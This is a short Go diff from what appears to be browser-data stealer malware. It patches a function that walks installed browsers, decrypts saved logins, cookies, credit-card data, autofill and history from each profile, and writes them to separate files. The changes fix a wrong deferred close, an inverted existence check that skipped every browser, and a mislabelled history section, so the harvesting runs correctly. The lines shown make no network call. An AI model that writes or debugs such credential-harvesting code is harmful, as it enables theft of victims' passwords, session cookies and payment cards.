@@ -64,7 +64,7 @@ func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCard
 		fmt.Printf("Failed to open or create history data file: %v\n", err)
 		return
 	}
-	defer autofillDataFile.Close()
+	defer HistoryDataFile.Close()
 	WriteOutputToFile(HistoryDataFile, "history data")
 	WriteOutputToFile(loginDataFile, "Starting data collection...\n\n")
 	WriteOutputToFile(cookieDataFile, "Cookie Data:\n\n")
@@ -72,7 +72,7 @@ func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCard
 	WriteOutputToFile(autofillDataFile, "Autofill Data:\n\n")
 
 	for browser, path := range browsers {
-		if CheckFileExist(path) {
+		if !CheckFileExist(path) {
 			continue
 		}
 
@@ -91,7 +91,7 @@ func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCard
 		creditCardsData := DecryptCreditCardsData(profiles, localStateTemp.Name())
 		WriteDataToFile(creditCardsDataFile, "Credit Cards Data", creditCardsData)
 		HistoryData := DecryptHistoryData(profiles)
-			WriteDataToFile(HistoryDataFile, "Credit Cards Data", HistoryData)
+			WriteDataToFile(HistoryDataFile, "History Data", HistoryData)
 	
 
 		autoFillData := DecryptAutoFillData(profiles)
